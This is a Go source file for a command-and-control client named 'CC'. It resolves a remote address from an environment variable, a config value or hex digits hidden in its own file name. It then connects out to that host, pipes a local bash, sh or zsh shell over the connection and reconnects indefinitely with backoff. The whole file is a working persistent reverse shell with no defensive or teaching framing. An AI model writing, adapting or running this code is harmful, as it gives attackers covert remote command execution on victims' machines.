package main

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/paalgyula/cc/config"
	"github.com/paalgyula/cc/pkg/connection"
)

var (
	ErrNoRemote         = errors.New("R is not configured")
	ErrNoAddrInFilename = errors.New("binary name does not contain a remote address")

	shellPaths = []string{
		"/bin/bash",
		"/usr/bin/bash",
		"/bin/sh",
		"/usr/bin/zsh",
		"/bin/zsh",
	}
)

func resolveRemoteFromName(name string) (string, error) {
	if !strings.Contains(name, "-") {
		return "", ErrNoAddrInFilename
	}

	fragments := strings.Split(name, "-")
	addr := fragments[len(fragments)-1]

	if len(addr) != 12 {
		return "", fmt.Errorf("address segment %q must be 12 hex characters", addr)
	}

	ipbytes := make([]byte, 4)
	var port int

	r := bytes.NewBufferString(addr)

	_, err := fmt.Fscanf(r, "%02x%02x%02x%02x%04x",
		&ipbytes[0], &ipbytes[1], &ipbytes[2], &ipbytes[3], &port)
	if err != nil {
		return "", fmt.Errorf("resolveRemoteFromName: %w", err)
	}

	return fmt.Sprintf("%d.%d.%d.%d:%d",
		ipbytes[0], ipbytes[1], ipbytes[2], ipbytes[3], port,
	), nil
}

func findShell() string {
	if shell := os.Getenv("SHELL"); shell != "" {
		if _, err := os.Stat(shell); err == nil {
			return shell
		}
	}

	for _, p := range shellPaths {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}

	return "/bin/sh"
}

func createShell(conn io.ReadWriteCloser) {
	defer conn.Close()

	subProcess := exec.Command(findShell())

	subProcess.Stdin = conn
	subProcess.Stdout = conn
	subProcess.Stderr = conn

	if err := subProcess.Start(); err != nil {
		fmt.Println("Failed to start command:", err)
		return
	}

	h, _ := os.Hostname()
	fmt.Fprintf(conn, "# CC connected %s\n", h)

	subProcess.Wait()
}

func resolveRemote() error {
	if config.Remote == "" {
		config.Remote = os.Getenv("R")
	}

	if config.Remote == "" {
		if addr, err := resolveRemoteFromName(os.Args[0]); err == nil {
			config.Remote = addr
		}
	}

	if config.Remote == "" {
		return ErrNoRemote
	}

	config.Info("R is set to: %s", config.Remote)

	return nil
}

func runSession() {
	retry := 0

	for {
		sleepSec := retry * retry
		if sleepSec > 60 {
			sleepSec = 60
		}
		if retry > 0 {
			config.Info("Reconnecting in %ds (attempt %d)", sleepSec, retry)
		}
		time.Sleep(time.Second * time.Duration(sleepSec))

		conn, err := connection.Connect(config.Remote)
		if err != nil {
			if errors.Is(err, syscall.ECONNREFUSED) {
				retry++
				continue
			}

			config.Info("error: %v\n", err)
			os.Exit(1)
		}

		retry = 0
		createShell(conn)
	}
}

// Entry point
func main() {
	config.Info("Starting CC")

	if err := resolveRemote(); err != nil {
		fmt.Println("error: ", err.Error())
		return
	}

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		sig := <-sigCh
		config.Info("Received %v, shutting down", sig)
		os.Exit(0)
	}()

	runSession()
}
